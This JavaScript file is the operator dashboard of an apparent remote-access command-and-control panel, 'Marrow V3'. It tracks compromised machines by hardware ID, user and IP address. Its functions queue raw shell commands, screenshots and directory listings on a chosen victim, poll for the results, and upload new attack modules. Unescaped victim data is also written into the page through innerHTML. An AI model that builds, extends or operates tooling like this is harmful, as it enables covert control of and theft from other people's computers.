
// Marrow V3 "Ultimate" Logic

let activeTarget = null;
let currentTab = 'console';
let statsChart = null;
let consoleHistory = [];

document.addEventListener('DOMContentLoaded', () => {
    initChart();
    startPolling();
    initHeatmap();
});

// --- NAVIGATION ---
function switchView(view) {
    document.querySelectorAll('.view-section').forEach(el => el.classList.add('hidden'));
    document.getElementById(`view-${view}`).classList.remove('hidden');
}

function crTab(tab) {
    document.querySelectorAll('.cr-tab').forEach(el => el.classList.add('hidden'));
    document.getElementById(`tab-${tab}`).classList.remove('hidden');
    currentTab = tab;
}

// --- CONTROL ROOM ---
let consolePollInterval = null;

function openControlRoom(hwid) {
    activeTarget = hwid;
    document.getElementById('cr-hwid').innerText = hwid;
    document.getElementById('controlRoom').classList.remove('translate-y-full');

    // Clear console and start polling tasks
    document.getElementById('console-output').innerHTML = `
        <div class="text-gray-500">[SYSTEM] Connecting to ${hwid}...</div>
        <div class="text-green-500">[SUCCESS] Uplink established. Encryption: AES-256.</div>
    `;

    if (consolePollInterval) clearInterval(consolePollInterval);
    consolePollInterval = setInterval(() => fetchConsole(hwid), 2000);
}

function closeControlRoom() {
    document.getElementById('controlRoom').classList.add('translate-y-full');
    activeTarget = null;
    if (consolePollInterval) clearInterval(consolePollInterval);
}

function handleCmd(e) {
    if (e.key === 'Enter') {
        const cmd = e.target.value;
        if (!cmd) return;

        // Optimistic UI update
        const con = document.getElementById('console-output');
        con.innerHTML += `<div class="text-white mt-1"><span class="text-cyber-green">root@target:~#</span> ${cmd}</div>`;
        e.target.value = '';
        con.scrollTop = con.scrollHeight;

        // Queue Task
        // Simple logic detection for module vs raw shell
        let module = 'shell';
        let args = cmd;

        if (cmd === 'ls') module = 'ls';
        if (cmd === 'screenshot') module = 'screenshot';
        if (cmd === 'whoami') { module = 'whoami'; args = ''; }

        // Send
        const fd = new FormData();
        fd.append('action', 'queue_task');
        fd.append('hwid', activeTarget);
        fd.append('module', module);
        fd.append('args', args);

        fetch('dashboard.php', { method: 'POST', body: fd });
    }
}

function fetchConsole(hwid) {
    // Fetch recent task results to populate console
    fetch(`dashboard.php?action=get_tasks&hwid=${hwid}`)
        .then(r => r.json())
        .then(tasks => {
            const con = document.getElementById('console-output');
            // Check for new completed tasks we haven't shown
            // NOTE: In a real app we'd track last ID shown. 
            // Simplified: Just showing last 5 for demo or checking IDs

            tasks.reverse().forEach(t => {
                if (t.status === 'completed' && !document.getElementById(`task-${t.id}`)) {
                    let color = 'text-gray-300';
                    let icon = '✔';
                    con.innerHTML += `
                        <div id="task-${t.id}" class="mt-2 border-l-2 border-gray-700 pl-2">
                            <div class="text-xs text-gray-500">[TASK ID: ${t.id}] ${t.module} ${t.command_args || ''}</div>
                            <pre class="${color} font-mono text-xs whitespace-pre-wrap">${t.result}</pre>
                        </div>
                    `;
                    con.scrollTop = con.scrollHeight;
                }
            });
        });
}

// --- MAIN DASHBOARD ---
function startPolling() {
    refreshData();
    setInterval(refreshData, 3000);
}

function refreshData() {
    fetch('dashboard.php?action=get_targets')
        .then(r => r.json())
        .then(targets => {
            const tbody = document.getElementById('targetList');
            tbody.innerHTML = '';
            targets.forEach(t => {
                const isOnline = (new Date() - new Date(t.last_seen)) < 300000; // 5 mins
                tbody.innerHTML += `
                    <tr class="hover:bg-[#111] group cursor-pointer transition-colors" onclick="openControlRoom('${t.hwid}')">
                        <td class="p-4"><div class="w-3 h-3 rounded-full ${isOnline ? 'bg-cyber-green shadow-[0_0_10px_#00ff9d]' : 'bg-red-900'}"></div></td>
                        <td class="p-4 font-mono text-white group-hover:text-cyber-green">${t.hwid}</td>
                        <td class="p-4 text-gray-400">${t.user_context}</td>
                        <td class="p-4 font-mono text-gray-500">${t.ip_address}</td>
                        <td class="p-4 text-xs text-gray-600">${t.last_seen}</td>
                        <td class="p-4 text-right"><span class="text-cyber-blue text-xs border border-cyber-blue px-2 py-1 rounded opacity-50 group-hover:opacity-100">CONNECT >_</span></td>
                    </tr>
                `;
            });

            // Update Stats
            const onlineCount = targets.filter(t => (new Date() - new Date(t.last_seen)) < 300000).length;
            document.getElementById('stat-total').innerText = targets.length;
            document.getElementById('stat-online').innerText = onlineCount;

            updateChart(onlineCount);
        });

    // Modules
    fetch('dashboard.php?action=get_modules').then(r => r.json()).then(mods => {
        document.getElementById('moduleList').innerHTML = mods.map(m => `<li class="text-gray-400 hover:text-white p-2 border-b border-[#222]">${m}</li>`).join('');
    });
}

function initChart() {
    const ctx = document.getElementById('miniChart').getContext('2d');
    statsChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: Array(20).fill(''),
            datasets: [{
                data: Array(20).fill(0),
                borderColor: '#00ff9d',
                borderWidth: 2,
                pointRadius: 0,
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            scales: { x: { display: false }, y: { display: false, min: 0 } },
            plugins: { legend: { display: false } }
        }
    });
}

function updateChart(val) {
    if (!statsChart) return;
    const data = statsChart.data.datasets[0].data;
    data.shift();
    data.push(val);
    statsChart.update();
}

function initHeatmap() {
    const hm = document.getElementById('heatmap');
    // Create random noise map basically
    for (let i = 0; i < 72; i++) {
        const d = document.createElement('div');
        d.className = `bg-cyber-green transition-opacity duration-[2000ms]`;
        d.style.opacity = Math.random() * 0.1;
        hm.appendChild(d);

        // Animate
        setInterval(() => {
            d.style.opacity = Math.random() * 0.3;
        }, 1000 + Math.random() * 3000);
    }
}

// Upload
function uploadModule() {
    const file = document.getElementById('moduleFile').files[0];
    if (!file) return;
    const fd = new FormData();
    fd.append('action', 'upload_module');
    fd.append('module_file', file);
    fetch('dashboard.php', { method: 'POST', body: fd }).then(() => refreshData());
}
